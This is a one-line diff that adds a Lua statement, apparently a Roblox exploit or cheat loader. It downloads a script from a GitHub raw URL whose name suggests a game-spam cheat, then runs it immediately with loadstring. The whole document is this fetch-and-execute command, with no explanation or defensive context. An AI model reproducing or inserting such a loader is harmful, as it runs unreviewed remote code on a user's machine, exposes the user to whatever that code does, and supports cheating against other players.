@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/new-mythic-hypershot-spam2-lqza7uo0gx0rx0.lua"))()
